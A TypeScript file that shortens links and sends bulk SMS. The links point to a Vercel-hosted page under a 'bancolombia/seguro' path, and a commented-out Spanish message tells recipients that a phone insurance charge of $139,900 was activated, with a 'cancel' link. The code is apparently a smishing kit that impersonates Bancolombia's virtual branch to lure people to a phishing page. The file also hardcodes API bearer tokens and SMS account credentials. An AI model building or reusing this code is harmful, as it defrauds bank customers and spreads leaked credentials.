export const createShortURL = async (name: string) =>
  await fetch('https://api.t.ly/api/v1/link/shorten', {
    body: JSON.stringify({
      long_url: `suc-app-personas-seguro-mobil.vercel.app/bancolombia/seguro?name=${name}`,
      domain: 'https://t.ly/',
      expire_at_datetime: '2035-01-17 15:00:00',
      description: 'Social Media Link',
    }),
    headers: {
      accept: 'application/json',
      'accept-language': 'en-US,en;q=0.8',
      authorization:
        'Bearer 2stJLAlW5EGZzQzD0xw0rDcOiBbcVRwjr9hcwsHEgwtvEiFJiB77pDta6Pgs',
      'content-type': 'application/json',
    },
    method: 'POST',
  }).then((res) => res.json());

const TOKEN_TLY =
  'qwxgQyV18ylRjJEwh0XAYZj6XeIsuNx6W87qMqcdXML1yRYwNh0u6ltg380E';

export const sendSMS = async (
  name: string,
  urlShorter: string,
  num = '3242378501'
) => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: '57' + num,

    // message: `${name}, Suc. Virtual Personas Te informa que se activo un seguro de celular protegido por $139,900. Si desea cancelar: ${urlShorter} TyC*`,
    message: 'hola',
  });

  const url = `${baseUrl}?${params.toString()}`;

  const response = await fetch(url, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
  });
  return response.json(); // Asumiendo que la respuesta es JSON
};
export const customSendSMS = async (message: string, num = '3242378501') => {
  const baseUrl = 'https://bulksmsplans.com/api/send_sms';
  const params = new URLSearchParams({
    api_id: 'APIVSyFoUzc120965',
    api_password: '573008948802',
    sms_type: 'Transactional',
    sms_encoding: 'text',
    sender: 'INFO',
    number: '57' + num,
    message,
  });

  const url = `${baseUrl}?${params.toString()}`;

  const response = await fetch(url, {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
  });
  return response.json(); // Asumiendo que la respuesta es JSON
};